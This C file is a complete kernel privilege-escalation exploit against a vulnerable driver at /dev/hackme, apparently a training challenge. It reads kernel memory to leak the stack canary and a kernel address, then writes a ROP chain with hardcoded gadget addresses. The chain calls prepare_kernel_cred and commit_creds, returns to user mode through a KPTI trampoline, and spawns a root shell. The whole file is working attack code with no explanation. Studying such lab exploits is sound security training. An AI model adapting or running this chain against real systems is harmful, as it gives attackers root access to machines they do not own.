#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int fd;

unsigned long user_ss, user_rsp, user_rflags, user_cs;

void *prepare_kernel_cred = (void*)0xffffffff814c67f0ul;
void *commit_creds = (void*)0xffffffff814c6410ul;

// 0xffffffff81006370: pop %rdi; ret; 
unsigned long pop_rdi = 0xffffffff81006370ul;
// 0xffffffff8150b97e: pop %rsi; ret; 
unsigned long pop_rsi = 0xffffffff8150b97eul;
// 0xffffffff816bf203: mov %rax, %rdi; mov %rdi, 0x140(%rsi); pop %rbp; ret; 
unsigned long mov_rax_rdi_pop_rbp = 0xffffffff816bf203ul;
unsigned long kpti_trampoline = 0xffffffff81200f10ul + 0x16;


void save_state(void) {
  asm volatile(
               "mov %cs, user_cs;"
               "mov %ss, user_ss;"
               "mov %rsp, user_rsp;"
               "pushfq; popq user_rflags;");
}

void init(void) {
  fd = open("/dev/hackme", O_RDWR);
  if (fd == -1) {
    puts("[!] error opening file");
    exit(-1);
  }

  save_state();
}

void hexdump(unsigned long *p, size_t n) {
  for (size_t i = 0; i < n; ++i) {
    printf("%03lu: %lx\n", i, p[i]);
  }
}

void shell(void) {
  system("/bin/sh");
}

int main() {
  puts("[+] nyahallo");
  init();

  unsigned long leak[42];
  read(fd, leak, 42*sizeof(unsigned long));
  hexdump(leak, 42);

  unsigned long canary = leak[16];
  printf("canary: 0x%lx", canary);

  unsigned long kernel_leak = leak[10];
  printf("kernel_leak: 0x%lx", kernel_leak);

  unsigned long writeable = leak[0]-0x1000;
  printf("writeable: 0x%lx", writeable);

  memset(leak, 0x41, 42*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = pop_rdi;
  *rop++ = 0;
  *rop++ = (unsigned long)prepare_kernel_cred;
  *rop++ = pop_rsi;
  *rop++ = writeable;
  *rop++ = mov_rax_rdi_pop_rbp;
  *rop++ = 0xc0cac01a;
  *rop++ = (unsigned long)commit_creds;
  *rop++ = kpti_trampoline;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = (unsigned long)shell+1;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;

  write(fd, leak, sizeof(leak));


  puts("[!] exploit failed ;_;");
  return 0;
}
